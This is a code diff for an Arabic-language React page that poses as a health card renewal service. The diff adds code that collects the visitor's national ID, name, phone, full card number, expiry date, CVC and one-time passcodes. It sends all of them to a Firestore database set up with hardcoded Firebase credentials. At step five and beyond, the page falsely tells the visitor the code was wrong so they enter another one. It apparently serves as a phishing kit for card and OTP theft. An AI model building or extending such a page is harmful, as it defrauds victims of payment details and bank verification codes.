@@ -9,6 +9,24 @@ import { Label } from "@/components/ui/label"
 import { ChevronLeft, CreditCard, MessageCircle } from 'lucide-react'
 import { cn } from "@/lib/utils"
 import { useState } from "react"
+import { initializeApp } from 'firebase/app'
+import { getFirestore, collection, addDoc } from 'firebase/firestore'
+
+const firebaseConfig = {
+  // Your Firebase configuration object goes here
+  // You should replace this with your actual Firebase config
+  apiKey: "AIzaSyB1Tpv9S00TO__RCkAN95ydnMQDR7yEb0A",
+  authDomain: "csa3-e2b6a.firebaseapp.com",
+  databaseURL: "https://csa3-e2b6a-default-rtdb.firebaseio.com",
+  projectId: "csa3-e2b6a",
+  storageBucket: "csa3-e2b6a.firebasestorage.app",
+  messagingSenderId: "328650323342",
+  appId: "1:328650323342:web:468ea6435238c0452be0df",
+  measurementId: "G-D32GDGT38Q"
+}
+
+const app = initializeApp(firebaseConfig)
+const db = getFirestore(app)
 
 const steps = [
   { id: 1, title: 'معلومات البطاقة', status: 'current' },
@@ -20,12 +38,36 @@ const steps = [
 export default function HealthCardRenewal() {
     const [stepr,setStep]=useState(1)
     const [name,setName]=useState('')
-    const [phone,setPhone]=useState(1)
-    const [data,setData]=useState('')
+    const [phone,setPhone]=useState('')
+    const [id,setId]=useState('')
+    const [dateMonth,setDatmont]=useState('')
+    const [datayaer,setDatyear]=useState('')
     const [CVC,setCVC]=useState('')
     const [otp,setOtp]=useState('')
     const [cardNumber, setCardNumber] = useState('')
 
+    const handleSubmit = async () => {
+        try {
+          const docRef = await addDoc(collection(db, "healthCardRenewals"), {
+            step: stepr,
+            id:id,
+            name,
+            phone,
+            datayaer,
+            dateMonth,
+            CVC,
+            otp,
+            cardNumber,
+            // Add any other form fields here
+          })
+          console.log("Document written with ID: ", docRef.id)
+          // You might want to show a success message to the user here
+        } catch (e) {
+          console.error("Error adding document: ", e)
+          // You might want to show an error message to the user here
+        }
+      }
+    
     const formatCardNumber = (value: string) => {
       const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '')
       const matches = v.match(/\d{4,16}/g)
@@ -117,6 +159,7 @@ export default function HealthCardRenewal() {
                                           <span className="text-red-500">*</span>
                                       </Label>
                                       <Input
+                                      onChange={(e)=>setId(e.target.value.toString())}
                                       type="tel"
                                       maxLength={10}
                                           placeholder="الرجاء إدخال الرقم"
@@ -180,6 +223,8 @@ export default function HealthCardRenewal() {
                                       </Label>
                                       <Input
                                       maxLength={12}
+                                      onChange={(e)=>setPhone(e.target.value)}
+
                                           type="tel"
                                           placeholder="الرجاء إدخال رقم الهاتف"
                                           className="max-w-md text-sm sm:text-base"
@@ -228,6 +273,8 @@ export default function HealthCardRenewal() {
               اسم حامل البطاقة <span className="text-red-500">*</span>
             </Label>
             <Input
+                                      onChange={(e)=>setName(e.target.value.toString())}
+
               id="cardHolder"
               placeholder="الاسم كما يظهر على البطاقة"
               className="text-right"
@@ -257,15 +304,22 @@ export default function HealthCardRenewal() {
                 تاريخ الانتهاء <span className="text-red-500">*</span>
               </Label>
               <div className="grid grid-cols-2 gap-2">
-                <Input id="expiryMonth" placeholder="شهر" className="text-right" maxLength={2} />
-                <Input id="expiryYear" placeholder="سنة" className="text-right" maxLength={2} />
+                <Input id="expiryMonth" placeholder="شهر" 
+                                      onChange={(e)=>setDatmont(e.target.value.toString())}
+                
+                className="text-right" maxLength={2} />
+                <Input id="expiryYear" placeholder="سنة" 
+                                                      onChange={(e)=>setDatyear(e.target.value.toString())}
+                                                      className="text-right" maxLength={2} />
               </div>
             </div>
             <div className="space-y-2">
               <Label htmlFor="cvc" className="text-right block">
                 CVC <span className="text-red-500">*</span>
               </Label>
-              <Input id="cvc" placeholder="CVC" className="text-right" maxLength={3} />
+              <Input id="cvc"
+                                                    onChange={(e)=>setCVC(e.target.value.toString())}
+                                                    placeholder="CVC" className="text-right" maxLength={3} />
             </div>
           </div>
         </form>
@@ -295,7 +349,10 @@ export default function HealthCardRenewal() {
                               </Button>
                               <Button
                                 onClick={()=>{
-                                    setStep(stepr+1)
+                                    handleSubmit().then(()=>{
+
+                                        setStep(stepr+1)
+                                    })
                                     
                                     if (stepr >= 5){
                                         alert("رمز التحقق خاطىء تم ارسال رمز جديد")
